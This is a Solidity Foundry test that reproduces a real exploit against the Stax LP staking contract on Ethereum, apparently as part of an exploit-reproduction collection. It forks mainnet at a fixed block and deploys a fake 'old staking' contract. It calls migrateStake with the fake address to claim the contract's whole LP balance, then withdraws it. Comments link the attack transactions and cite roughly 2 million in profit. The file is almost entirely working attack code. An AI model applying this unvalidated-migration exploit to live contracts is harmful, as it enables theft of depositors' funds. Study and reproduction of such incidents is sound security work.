pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external;
}

contract fakeOldStakingContract {
    function migrateWithdraw(address, uint256) public{}
}

contract Exploit {
    function Start(address fakeOldStaking) public{
        address lp = 0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9;
        address StaxLPStaking = 0xd2869042E12a3506100af1D192b5b04D65137941;
        
        uint256 StakesAmount = IERC20(lp).balanceOf(StaxLPStaking);
        IStaxLPStaking(StaxLPStaking).migrateStake(fakeOldStaking, StakesAmount);
        IStaxLPStaking(StaxLPStaking).withdrawAll(false);
    }
}


contract test is DSTest{
    fakeOldStakingContract internal fakeoldcontract;
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 15725066);
    }
    function testExploit() public {
        fakeoldcontract = new fakeOldStakingContract();
        exploit = new Exploit();
        exploit.Start(address(fakeoldcontract));
        verify();
    }

    function verify() public {
        //Attack_tx:https://etherscan.io/tx/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5
        emit log_named_decimal_uint("============== Attack to get LP Token : ~", IERC20(address(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9)).balanceOf(address(exploit)), 18);
        //Remove liquidity and sale_tx:https://etherscan.io/tx/0x4b119a4f4ba1ad483e9851973719f310527b43f3fcc827b6d52db9f4c1ddb6a2
        console.log("============== Attack profit: ~ 2 Million"); //I'm too lazy
    }
}